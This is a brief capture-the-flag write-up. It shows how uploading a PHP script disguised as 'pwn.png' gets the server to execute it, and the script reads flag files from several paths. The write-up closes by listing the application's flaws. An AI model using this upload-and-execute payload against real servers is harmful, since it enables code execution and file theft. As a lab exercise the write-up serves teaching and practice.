![](just-upload-it.png)

The upload endpoint is `/upload.php`.  Files with the extension `png` are
accepted.  Create a file `pwn.png` with this content:
```php
<?php
readfile("flag");
readfile("flag.txt");
readfile("../flag");
readfile("../flag.txt");
readfile("/flag");
readfile("/flag.txt");
?>
```
Upload it.

> Your image has successfully been uploaded to /images

Navigate to `/images/pwn.png`.
```
VuwCTF{Just_up10d_ITl_ol}
```

# Mistakes this application made

- executing untrusted data as php
- not restricting the application's access to the filesystem
